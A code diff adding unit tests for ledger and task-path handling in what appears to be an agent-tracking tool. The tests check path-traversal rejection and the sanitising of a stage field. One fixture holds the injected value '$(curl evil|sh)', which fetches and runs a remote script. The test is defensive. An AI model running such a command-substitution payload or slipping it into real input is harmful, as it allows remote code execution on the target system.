@@ -1,6 +1,6 @@
 import { expect, test } from 'claude-code/testing'
 
-import { act, agentFile, band, effortOf, nextStep, parseState, persona, verdict } from './band'
+import { act, agentFile, band, costLine, effortOf, nextStep, parseState, persona, verdict } from './band'
 import { tasksOf } from './register'
 import { frame, portraitFor, SIZE, SPRITES } from './portraits'
 
@@ -43,6 +43,18 @@ test('tasksOf: the session pins its task from its own prompts', () => {
   // Every path is a candidate; pin() keeps the first whose state.md exists, so a doc example never wins.
   expect(tasksOf('resolves to `feature-research/ar-123-title/`; execute feature-research/ar-9-x/plan.md')).toEqual(['ar-123-title', 'ar-9-x'])
   expect(tasksOf('plain prompt')).toEqual([])
+  // `.` and `..` would aim the ledger write at the repo root.
+  expect(tasksOf('/anderson:start ..')).toEqual([])
+  expect(tasksOf('see feature-research/../ and feature-research/./')).toEqual([])
+})
+
+test('costLine: one ledger line per finished seat', () => {
+  const s = { id: 'a', name: 'NEO', model: 'sonnet/medium', startedAt: 10, lastAt: 20, stage: 'implement', tokens: 500 }
+  expect(JSON.parse(costLine(s, 90))).toEqual({ stage: 'implement', seat: 'NEO', model: 'sonnet/medium', tokens: 500, start: 10, end: 90 })
+  expect(costLine(s, 90).endsWith('\n')).toBe(true)
+  const bare = { id: 'b', name: 'SERAPH', model: 'opus/high', startedAt: 1, lastAt: 1 }
+  expect(JSON.parse(costLine({ ...s, stage: '$(curl evil|sh)' }, 2)).stage).toBe('?')
+  expect(JSON.parse(costLine(bare, 2))).toEqual({ stage: '?', seat: 'SERAPH', model: 'opus/high', tokens: 0, start: 1, end: 2 })
 })
 
 test('band: crew grid, stall, verdict, and shrink when crowded', () => {
